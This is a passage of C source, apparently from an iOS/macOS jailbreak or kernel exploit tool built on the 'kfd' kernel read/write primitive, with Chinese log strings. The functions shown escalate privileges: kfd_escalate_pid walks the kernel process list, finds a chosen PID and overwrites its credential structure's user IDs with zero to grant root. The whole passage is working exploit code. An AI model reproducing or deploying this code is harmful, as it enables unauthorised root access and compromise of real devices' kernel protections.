    if (r != 0) return r;
    r = kfd_open();
    if (r != 0) return r;
    r = kfd_get_root();
    if (r != 0 && geteuid() == 0) {
        printf("[kfd] get_root 返回错误但 EUID=0，提权可能已生效\n");
        return 0;
    }
    if (r == 0) printf("[kfd] escalate complete - UID=%d EUID=%d\n", getuid(), geteuid());
    return r;
}

int kfd_is_root(void) {
    return (getuid() == 0 || geteuid() == 0) ? 1 : 0;
}

int kfd_escalate_pid(pid_t pid) {
    if (!g_ready) { SETERR("kfd not ready"); return -1; }
    printf("[kfd] escalate_pid: 查找 PID=%d...\n", pid);

    uint64_t allproc_head = g_offs->allproc;
    uint64_t proc = 0;
    if (kread64(allproc_head, &proc) != 0) { SETERR("读取 allproc 失败"); return -1; }

    uint64_t first = proc;
    for (int i = 0; i < 4096 && proc != 0; i++) {
        uint64_t next = 0; kread64(proc + PROC_LIST_NEXT, &next);
        uint64_t pv = 0;
        if (kread64(proc + PROC_PID, &pv) == 0) {
            if ((pid_t)(uint32_t)pv == pid) {
                printf("[kfd] ✅ 找到 PID=%d, proc=0x%llx\n", pid, proc);
                uint64_t uc = 0;
                if (kread64(proc + PROC_UCRED, &uc) != 0) { SETERR("读取 ucred 失败"); return -1; }
                printf("[kfd]    ucred=0x%llx\n", uc);
                kwrite32(uc + UCRED_UID, 0);
                kwrite32(uc + UCRED_RUID, 0);
                kwrite32(uc + UCRED_SVUID, 0);
                kwrite32(uc + 0x28, 0);
                uint64_t vf = 0xFF; kread64(uc + UCRED_UID, &vf);
                printf("[kfd]    验证: cr_uid=0x%llx\n", (unsigned long long)(vf & 0xFFFFFFFF));
                return ((vf & 0xFFFFFFFF) == 0) ? 0 : -1;
            }
        }
        if (next == 0 || next == first) break;
        proc = next;
    }
    SETERR("未找到 PID=%d", pid);
    return -1;
}
